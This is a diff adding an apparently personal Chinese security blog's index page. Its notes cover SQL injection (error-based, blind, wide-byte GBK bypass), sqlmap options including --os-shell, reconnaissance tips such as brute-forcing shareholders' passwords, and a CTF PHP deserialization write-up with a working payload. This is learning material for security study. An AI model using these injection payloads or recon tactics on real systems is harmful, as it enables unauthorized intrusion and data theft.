+<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20220227230846577.png" alt="image-20220227230846577"></p>
+<p>进行报错注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or updatexml(1,concat(0x7e,(select database())),1),1)#   //爆库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">or</span> <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>())),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#  //爆表</span></span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘xx’)),1),1)#         //爆字段</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第二题</strong></p>
+<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20220227231127780.png" alt="image-20220227231127780"></p>
+<p>注入方式为referer。</p>
+<p><strong>第三题</strong></p>
+<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20220227231226623.png" alt="image-20220227231226623"></p>
+<p>注入方式为X-Forwarded-For</p>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>有时目标存在注入,但在页面上没有任何回显,此时，我们需要利用一些方法进行判断或者尝试得到数据，这个过程称之为盲注</p>
+<p><img src="C:\Users\86152\Desktop\image-20220227161901092.png" alt="image-20220227161901092"></p>
+<p><img src="C:\Users\86152\Desktop\image-20220227161916712.png" alt="image-20220227161916712"></p>
+<p><strong>注入方法</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">length</span>() 函数 返回字符串的长度</span><br><span class="line">	?id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">length</span>(<span class="title function_ invoke__">database</span>())&gt;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">substr</span>() 截取字符串 , 从第一位截取一个</span><br><span class="line">	?id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;k&#x27;</span></span><br><span class="line"><span class="title function_ invoke__">ord</span>()/<span class="title function_ invoke__">ascii</span>() 返回字符的ascii码  </span><br><span class="line">	?id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">107</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p>时间型<br>sleep() 将程序挂起一段时间n为n秒</p>
+</li>
+<li><p>if(expr1,expr2,expr3) 判断语句</p>
+<p>如果第一个语句正确就执行第二个语句如果错误执行第三个语句<br>?id&#x3D;1’ and If(length(database())&#x3D;8,1,sleep(5))– +</p>
+</li>
+</ul>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p><strong>magic_quotes_gpc（魔术引号开关）</strong></p>
+<blockquote>
+<p>magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p>
+</blockquote>
+<p>作用：</p>
+<p>当PHP的传参中有特殊字符（单引号，双引号，反斜线）就会再前面加转义字符’&#39;,来做一定的过滤</p>
+<p>使输入的东西如果不能闭合掉单引号和双引号，从而使sql注入无法进行</p>
+<p><strong>GBK编码格式</strong><br>   GBK全称《汉字内码扩展规范》,gbk是一种多字符编码。他使用了双字节编码方案，因为双字节编码所以gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。我们可以通过输出来验证这句话。</p>
+<blockquote>
+<p>例如：0xD50×5C 对应了汉字“    ”，URL编码用百分号加字符的16进制编码表示字符，于是 %d5%5c 经URL解码后为“誠”。</p>
+</blockquote>
+<p><strong>原理</strong></p>
+<p> 宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。</p>
+<p>当PHP发送请求到MySql时使用了语句<strong>SET NAMES ‘gbk’</strong> 或是**SET character_set_client &#x3D;gbk **进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。</p>
+<p><strong>绕过</strong></p>
+<p>我们发现\的编码是%5c，然后我们会想到传参一个字符想办法凑成一个gbk字符,例如：‘運’字是%df%5c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1\&#x27;&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>这条语句因为\使我们无法去注入，那么我们是不是可以用%df吃到%5c,因为如果用GBK编码的话这个就是運，所以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1�\&#x27;#&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>�\ 实际上就是那个運字</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2022/02/27/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/sql%E5%9F%BA%E7%A1%80/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-我的文章/sqlmap基础" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="sqlmap基础"><a href="#sqlmap基础" class="headerlink" title="sqlmap基础"></a>sqlmap基础</h3><p>-u 指定注入点<br>–dbs 跑库名<br>–tables 跑表名<br>–columns 跑字段名<br>–dump 枚举数据(很危险，容易出事)<br>-D 指定库 -T 指定表 -C 指定字段</p>
+<p>–random-agent  选择随机user-agents头<br>    –delay&#x3D;1 每次探测延时1秒（防止访问过快被ban）<br>    –count 查看数据量<br>    –proxy “<a href="http://127.0.0.1:1080&quot;">http://127.0.0.1:1080&quot;</a>  使用本地1080端口<br>    –level 1-5 测试等级（最低1，最高5） level等级越高检测越详细，例如 level大于2会检测cookie注入，大于3会检测头注入 –risk 2                                             (–level 3 –risk 2)<br>    –is-dba            查询当前用户权限，如果DBA是True可以尝试直接拿webshell<br>    –os-shell    尝试往网站中放入一个cmdshell(就是拥有cmd权限的shell),先选择写入shell的脚本语言</p>
+<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20220227153837131.png" alt="image-20220227153837131"></p>
+<p>​    有的需要填写网站的web目录的绝对路径，有的可以直接选择好shell的脚本语言类型就可以直接拿shell<br>​    </p>
+<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20220227153846358.png" alt="image-20220227153846358"></p>
+<h4 id="SQLMAP-跑-POST注入"><a href="#SQLMAP-跑-POST注入" class="headerlink" title="SQLMAP 跑 POST注入"></a>SQLMAP 跑 POST注入</h4><p>1、–form 他会自动检测表单 （Form） From<br>2、-r 抓包跑</p>
+<p>​            利用burp抓包，将内容复制成txt文档，-r xx.txt命令</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2022/02/27/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/sqlmap%E5%9F%BA%E7%A1%80/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-我的文章/正则匹配" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><blockquote>
+<p>​    1、正则表达式的格式？</p>
+<p>​        “&#x2F;表达式&#x2F;[修饰符]”</p>
+<p>​    2、正则表达式的用途是什么？</p>
+<p>（1）判断字符串是否符合某一规则（比如判断是否符合手机号、邮箱规则等等）</p>
+<p>（2）从一个字符串中找出符合规则的所有子字符串（比如取HTML标签名等等）</p>
+<p>​    3、当使用正则表达式时要注意什么？</p>
+<p>在php中使用正则表达式时一定要写标识符&#x2F;&#x2F;（ &#x2F;表达式&#x2F; ）</p>
+<p>​    5、php中正则表达式常用相关函数是什么？</p>
+<p>Preg_match_all(正则表达式、匹配字符串、匹配到的东西放入数组)</p>
+<p>该函数会返回匹配到的次数（可能是0），或者如果发生错误返回FALSE</p>
+<p>preg_replace(正则表达式、替换成什么、匹配字符串)说</p>
+<p>该函数会返回替换后的结果</p>
+<p>​    6、正则表达式的语法——字符（一）</p>
+<p>数字：\d</p>
+<p>非数字：\D</p>
+<p>空白字符（空格、制表符、换页符等）：\s</p>
+<p>非空白字符：\S</p>
+<p>单词字符（26个英文字母+数字+下划线）：\w</p>
+<p>非单词字符：\W</p>
+<p>​    7、正则表达式的语法——字符（二）</p>
+<p>字符集合：[单个字符或字符区间]，用于匹配集合内字符</p>
+<p>比如：</p>
+<p>[a-z]表示a-z这26个小写字母</p>
+<p>[0-9a-z]表示0-9这10个数字和a-z这26个小写字母</p>
+<p>[123a-h]表示包含数字1，2，3和a-h这8个字母</p>
+<p>注意：两个不同的字符段间一定不要用逗号隔开</p>
+<p>非集合字符：[^单个字符或字符区间]，用于匹配非集合内字符</p>
+<p>比如：</p>
+<p>[^0-9]表示匹配所有非数字字符</p>
+<p>[^a-zA-Z]表示匹配所有非字母字符</p>
+<p>​    8、字符集合的数字区间该注意什么？</p>
+<p>数字区间正则只能匹配0-9的数字，因为正则只能一位一位的匹配，所以超过9以外的数字只是我们给的概念，对于正则机制来说它是认不到的，比如[100-120]就无法被匹配</p>
+<p>​    9、正则表达式的语法——关键字</p>
+<p>() 表示一个整体</p>
+<p>^ 匹配输入字符串的开始位置</p>
+<p>$ 匹配输入字符串的结尾位置</p>
+<p>. 通配符，代表任意字符但不匹配换行</p>
+<p>* 匹配0次或者多次           </p>
+<p>+ 匹配1次或者多次</p>
+<p>\ 转义字符</p>
+<p>| 两项之间的一个选择</p>
+<p>​    10、转义字符“\”的使用</p>
+<p>转义字符主要是将一些特殊字符转为普通字符。而这些常用特殊字符有”.”、”?”、”\”等。</p>
+<p>​    11、^和$结合使用的注意问题？</p>
+<p>如果^和$结合使用且中间没有其他表达式，那么他们中间就不能出现别的字符，不然无法匹配，比如&#x2F;^3b$&#x2F;表示3开头b结尾，所以只有3b才能被匹配，如果写了3acb就无法被匹配。什么情况下才能被匹配呢，可以使用.（通配符）。</p>
+<p>​    12、非集合字符的“^”和关键字“^”的区别？</p>
+<p>非集合字符的“^”可理解为排除字符，排除操作，一般放在［］中，如［^1-5］, 表示该字符不是1-5之间的数字；而关键字的“^”表示行开始，如”^ab”表示以ab开头的字符串。</p>
+<p>​    13、正则表达式的语法——限定符</p>
+<p>{n} 例如0{8} 表示只有连起来8个0才会被匹配</p>
+<p>{n,} 例如0{2,} 表示只要2个0及其以上的就会被匹配</p>
+<p>{n,m} 例如0{2,4} 表示最少匹配2个0，最多匹配4个0</p>
+<p>注：被匹配时，默认匹配最多的次数</p>
+<p>​    14、正则表达式的语法——修饰符</p>
+<p>i 表示不区分大小写</p>
+<p>A 匹配规则必须从头开始匹配</p>
+<p>s 表示.将匹配一切字符</p>
+<p>x 表示正则表达式中的空白字符会被忽略</p>
+<p>e 代码执行仅限preg_replace()</p>
+<p>​    15、匹配模式的优先级是什么？（优先级从高到低排）</p>
+<p>\转义字符；()[]大原子和原子表；*+?{n}{n,}{n,m}重复匹配（匹配次数）；^$\b\B边界限制；|模式选择</p>
+</blockquote>
+<p>“.*”:  匹配任意字符</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2022/02/24/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-我的文章/信息搜集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="常用可利用点"><a href="#常用可利用点" class="headerlink" title="常用可利用点"></a>常用可利用点</h3><ul>
+<li><ul>
+<li><p>网络拓扑信息</p>
+<p>外网出口</p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>IP信息</p>
+<p>C段</p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>线下网络</p>
+<p>Wi-FiSSID认证信息</p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>VPN</p>
+<p>厂商登录方式</p>
+</li>
+</ul>
+</li>
+<li><p>邮件网关</p>
+</li>
+<li><p>手机APP</p>
+</li>
+<li><p>小程序后台</p>
+</li>
+<li><p>OA</p>
+</li>
+<li><p>SSO</p>
+</li>
+<li><p>边界网络设备</p>
+</li>
+<li><p>上游运营商</p>
+</li>
+</ul>
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><ol>
+<li>whois域名注册的时候留下的信息可以直接被查到。查询地址<a target="_blank" rel="noopener" href="https://whois.com/">https://whois.com</a></li>
+<li>需要查询企业时，可使用企查查，天眼查，小蓝本（推荐）网址为：<a target="_blank" rel="noopener" href="https://www.xiaolanben.com/pc">https://www.xiaolanben.com/pc</a></li>
+</ol>
+<p>​    查询时可注意：<strong>公司的股东肯定是高层，高层会有很高的权限。可以通过股东的名字去爆破他的密码</strong></p>
+<h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h3><p>子域名可以通过证书查询。</p>
+<p>​    因为HTTPS的网站要比HTTP的网站更加安全，而HTTPS则需要证书才能实现，所以查询子域名时可以通过证书来实现。</p>
+<p>​        推荐网站：<a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh</a>  使用：如要查询百度的子域名，在其中输入baidu.com即可</p>
+<h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>电脑会开启一些端口，端口会承载一些功能，有一些端口容易存在漏洞。</p>
+<blockquote>
+<p>如 445（永恒之蓝）    3389（爆破，0708）    6379（redis未授权访问）</p>
+</blockquote>
+<p>或者有些网站没有给域名，直接给了端口（8080）</p>
+<h4 id="探测方法"><a href="#探测方法" class="headerlink" title="探测方法"></a>探测方法</h4><p> nmap，搜索引擎</p>
+<p><strong>网络搜索引擎</strong></p>
+<p>针对网络设备的搜索。 fofa 钟馗之眼 <a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so/</a>     </p>
+<p>使用参考<strong>查询语法参考</strong></p>
+<p><strong>nmap</strong></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>访问一个网站，其实都是在访问某个服务器的某个文件夹，不同的目录里面完全不通过。在里面可以找到一些后台登陆地址，也能找到一些报错。</p>
+<p><strong>原理</strong>    使用字典，然后依次拼接访问</p>
+<p>使用7kbscan</p>
+<h3 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h3><p>旁站就是指同ip的站点，可以用网络在线工具-站长工具查询</p>
+<p>查询原因：1.同服务器时，拿下旁站就等于拿下整个服务器</p>
+<p>​                    2.同内网，可以从内网渗透，内网防御性较低。</p>
+<h3 id="c段扫描"><a href="#c段扫描" class="headerlink" title="c段扫描"></a>c段扫描</h3><p>192.168.1.0—192.168.1.255 在同一个c段</p>
+<p>也就是 x.x.x.0-255</p>
+<p>扫描原因：很多公司买ip时会财大气粗的用同一个c段</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2022/02/23/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-我的文章/序列化与反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p>
+<p>所有序列化对于不同类型得到的字符串格式为：</p>
+<ul>
+<li><p><code>String</code> : s:size:value;</p>
+</li>
+<li><p><code>Integer</code> : i:value;</p>
+</li>
+<li><p><code>Boolean</code> : b:value;(保存1或0)</p>
+</li>
+<li><p><code>Null</code> : N;</p>
+</li>
+<li><p><code>Array</code> : a:size:{key definition;value definition;(repeated per element)}</p>
+</li>
+<li><p><code>Object</code> : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</p>
+</li>
+</ul>
+<h3 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()     //将一个对象转换成一个字符串</span><br><span class="line">unserialize()   //将字符串还原成一个对象</span><br></pre></td></tr></table></figure>
+
+<p>通过序列化与反序列化我们可以很方便的在php中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。</p>
+<p>在利用对php反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p>
+<h3 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()//创建对象时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
+
+<h3 id="比较重要的方法"><a href="#比较重要的方法" class="headerlink" title="比较重要的方法"></a>比较重要的方法</h3><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote>
+<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
+</blockquote>
+<p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
+<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="wakeup()"></a><strong>wakeup()</strong></h4><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>
+<p>绕过：<strong>wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行</strong></p>
+<p>例题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public $flag = &#x27;111&#x27;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#x27;bad requests&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20211201194244242.png" alt="image-20211201194244242"></p>
+<p>接下来再来一道难度三颗星的例题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Demo &#123; </span><br><span class="line">    private $file = &#x27;index.php&#x27;;</span><br><span class="line">    public function __construct($file) &#123; </span><br><span class="line">        $this-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123; </span><br><span class="line">        echo @highlight_file($this-&gt;file, true); </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup() &#123; </span><br><span class="line">        if ($this-&gt;file != &#x27;index.php&#x27;) &#123; </span><br><span class="line">            //the secret is in the fl4g.php</span><br><span class="line">            $this-&gt;file = &#x27;index.php&#x27;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;var&#x27;])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[&#x27;var&#x27;]); </span><br><span class="line">    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;, $var)) &#123; </span><br><span class="line">        die(&#x27;stop hacking!&#x27;); </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    highlight_file(&quot;index.php&quot;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在 Demo 对象中有个 file 字段，根据默认值存储的应该是某个 PHP 文件名</p>
+<p>根据提示 flag 在文件fl4g.php中，因此我们先构造出 file 值为fl4g.php的 Demo 对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来观察到有个preg_match() 函数进行正则匹配,<strong>“&#x2F;[oc]:\d+:&#x2F;i” 正则匹配的字符串，是在不区分大小写的情况下匹配 “o:数字” 或者 “c:数字’ 的字符串</strong></p>
+<p>绕过的方式是使用<strong>4 的同义表示方法 +4</strong></p>
+<p>同时还需要绕过 wakeup() 函数</p>
+<p>修改后的字符串如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后注意到还有个 base64_decode() 函数进行 base64 解码</p>
+<p>故最后的payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var=TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30=</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2022/02/23/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">展开全文 >></a>
     </p>
     
 
@@ -542,7 +1430,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018-2022 <a href="http://example.com/" target="_blank">John Doe</a>
+    		&copy; 2018-2022 <a href="http://example.com/" target="_blank">Whirlpool</a>
     	</div>
       	<div class="footer-right">
 			
